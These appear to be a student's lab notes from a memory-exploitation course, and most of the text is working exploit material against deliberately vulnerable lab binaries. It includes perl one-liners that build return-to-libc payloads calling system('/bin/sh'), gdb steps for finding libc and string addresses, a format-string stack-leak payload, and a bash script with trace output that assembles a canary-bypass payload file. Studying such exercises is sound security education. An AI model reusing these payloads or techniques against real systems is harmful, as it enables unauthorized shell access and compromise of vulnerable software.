```
               [AAAAAAAAA…A][SYSADDR][SYSRET][CMDADDR][COMMAND] 
$(perl -e 'print "A"x28 . "\xa0\x2d\xe4\xb7" . "JUNK" . "\x08\xe9\xff\xbf" . "/"x50 . "/bin/sh"')
```

# examples
```
print system -> 0xf7e1ce10

(gdb) find 0xf7de0000, 0xf7fb6000, "/bin/sh"
0xf7f5b88f
1 pattern found.
(gdb) x/s 0xf7f5b88f


0xffffcf18 + 16
0xffffcf1c
```

```
$(perl -e 'print "A"x28 . "\x10\xce\xe1\xf7" . "JUNK" . "\x1c\xcf\xff\xff" . "/"x50 . "/bin/sh"')
```


# commands

```
print system
print exit

info proc map 

readelf -l P

```



```
DEPVuln (mod 6/7)  Desktop647/BufferOverflowPrograms/Module6/DEPVuln/DEPVuln.c
(gdb) p system
$1 = {int (const char *)} 0xb7e192e0 <__libc_system>
(gdb) p exit
$2 = {void (int)} 0xb7e0c4b0 <__GI_exit>
Hint: Address of buffer: 0xbffff470

./DEPVuln $(perl -e 'print "A"x28 . "\xe0\x92\xe1\xb7" . "\xb0\xc4\xe0\xb7" . "\xb8\xf4\xff\xbf" . "/"x50 . "/bin/sh"')

export scmd="//////////////////////////bin/sh"
./DEPVuln $(perl -e 'print "A"x28 . "\xe0\x92\xe1\xb7" . "\xb0\xc4\xe0\xb7" . "\xb8\xf4\xff\xbf" . "/"x50 . "/bin/sh"')

##
(gdb) find 0xb7ddc000, 0xb7fb1000, "/bin/sh"
0xb7f5a0af
1 pattern found.

$ ./DEPVuln $(perl -e 'print "A"x28 . "\xe0\x92\xe1\xb7" . "\xb0\xc4\xe0\xb7" . "\xaf\xa0\xf5\xb7"')


```

```
student@CS647:~/Desktop/BufferOverflowPrograms/Module6/printfVuln$ ./printfVuln $(perl -e 'print "%08x...."x20')
Hello 00c30000....00000000....b7f42000....00000000....00000000....00000000....bf941622....00000009....bf941615....b7d4f589....00000000....00000000....00000000....00000000....9e0f8400....b7ef73fc....00000000....bf940458....08048598....bf941622....
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
student@CS647:~/Desktop/BufferOverflowPrograms/Module6/printfVuln$ ./printfVuln $(perl -e 'print "%08x...."x20')
Hello 00c30000....00000000....b7fe4000....00000000....00000000....00000000....bffb4622....00000009....bffb4615....b7df1589....00000000....00000000....00000000....00000000....4e8d4e00....b7f993fc....00000000....bffb4078....08048598....bffb4622....
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```


## leakit.sh
```bash
#!/usr/bin/perl
print "%08x........"x100
```

## makeit.sh
```bash
#!/usr/bin/env bash
set -ex

CAN=1ef9f600
SYS=b7e192e0
EX=b7e0c4b0
CMD=b7f5a0af

function tolittle() {
    v=$1
    v2="\x${v:6:2}\x${v:4:2}\x${v:2:2}\x${v:0:2}"
    echo $v2

}

CAN=$(tolittle "$CAN")
SYS=$(tolittle "$SYS")
EX=$(tolittle "$EX")
CMD=$(tolittle "$CMD")

# perl << 'EOF'
# print "A"x4 . $CAN . "A"x12 . "$SYS" . "B"x4 . "$CMD"
# EOF

#perl -e 'print "A"x200 . "$ARGV[0]" . "A"x12 . "$ARGV[1]" . "A"x4 . "$ARGV[3]"' $CAN $SYS $EX $CMD > file2.bin

```

```
+ CAN=1ef9f600
+ SYS=b7e192e0
+ EX=b7e0c4b0
+ CMD=b7f5a0af
++ tolittle 1ef9f600
++ v=1ef9f600
++ v2='\x00\xf6\xf9\x1e'
++ echo '\x00\xf6\xf9\x1e'
+ CAN='\x00\xf6\xf9\x1e'
++ tolittle b7e192e0
++ v=b7e192e0
++ v2='\xe0\x92\xe1\xb7'
++ echo '\xe0\x92\xe1\xb7'
+ SYS='\xe0\x92\xe1\xb7'
++ tolittle b7e0c4b0
++ v=b7e0c4b0
++ v2='\xb0\xc4\xe0\xb7'
++ echo '\xb0\xc4\xe0\xb7'
+ EX='\xb0\xc4\xe0\xb7'
++ tolittle b7f5a0af
++ v=b7f5a0af
++ v2='\xaf\xa0\xf5\xb7'
++ echo '\xaf\xa0\xf5\xb7'
+ CMD='\xaf\xa0\xf5\xb7'
+ perl -e 'print "A"x200 . "$ARGV[0]" . "A"x12 . "$ARGV[1]" . "A"x4 . "$ARGV[3]"' '\x00\xf6\xf9\x1e' '\xe0\x92\xe1\xb7' '\xb0\xc4\xe0\xb7' '\xaf\xa0\xf5\xb7'
```

## command used
```bash
perl -e 'print "A"x200 . "\x00\xf6\xf9\x1e" . "A"x12 . "\xe0\x92\xe1\xb7" . "\xb0\xc4\xe0\xb7" . "\xaf\xa0\xf5\xb7"' > file.bin
```


# getting offset:
```
Breakpoint 2, 0x0804874f in main (argc=1, argv=0xbff213d4) at vulnFileCopy.c:22
22      }
(gdb) stepi
0xb7d6ef21 in __libc_start_main (main=0x80486eb <main>, argc=1, argv=0xbff213d4, init=0x8048930 <__libc_csu_init>, fini=0x8048990 <__libc_csu_fini>, rtld_fini=0xb7f619c0 <_dl_fini>, stack_end=0xbff213cc)
    at ../csu/libc-start.c:310
310     ../csu/libc-start.c: No such file or directory.
(gdb) p system
$1 = {int (const char *)} 0xb7d932e0 <__libc_system>
(gdb) print /x 0xb7d6ef21 - 0xb7d932e0
$2 = 0xfffdbc41
(gdb) print /x 0xb7d932e0 - 0xb7d6ef21
$3 = 0x243bf
```


